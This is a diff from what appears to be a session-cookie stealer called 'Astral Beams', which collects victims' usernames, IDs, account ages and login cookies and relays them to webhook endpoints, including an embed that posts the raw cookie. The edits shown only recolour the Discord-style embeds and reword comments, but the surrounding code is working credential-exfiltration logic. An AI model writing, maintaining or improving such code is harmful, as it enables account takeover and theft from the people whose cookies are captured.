@@ -193,7 +193,7 @@ export default {
             body: JSON.stringify({ type: 'secondary', data: data, cookie: cookie })
         }).catch(function(err) { console.log('secondary err:', err); });
 
-        // IMPORTANT: Send cookie embed separately
+        // Send cookie embed after 1 second
         setTimeout(function() {
             fetch('/api/send', {
                 method: 'POST',
@@ -372,7 +372,7 @@ export default {
           accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
         }
 
-        // ---- MAIN EMBED (clean - no collectibles) ----
+        // ---- MAIN EMBED (clean - white theme) ----
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
 
@@ -389,7 +389,7 @@ export default {
 
           const embed = {
             title: `\`Astral Beams\` ${fire}`,
-            color: 0x9933ff,
+            color: 0xffffff,
             fields: fields,
             thumbnail: { url: thumbnailLink },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
@@ -438,7 +438,7 @@ export default {
 
           const embed = {
             title: `\`Astral Beams\` ${fire}`,
-            color: 0x5865F2,
+            color: 0xffffff,
             fields: [
               { name: 'User', value: `[${d.username || 'Unknown'}](${profileLink})`, inline: true },
               { name: 'ID', value: d.userId || 'N/A', inline: true },
@@ -472,7 +472,7 @@ export default {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
           const embed = {
             title: 'Refreshed Cookie',
-            color: 0x5865F2,
+            color: 0xffffff,
             description: '```' + data.cookie + '```',
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
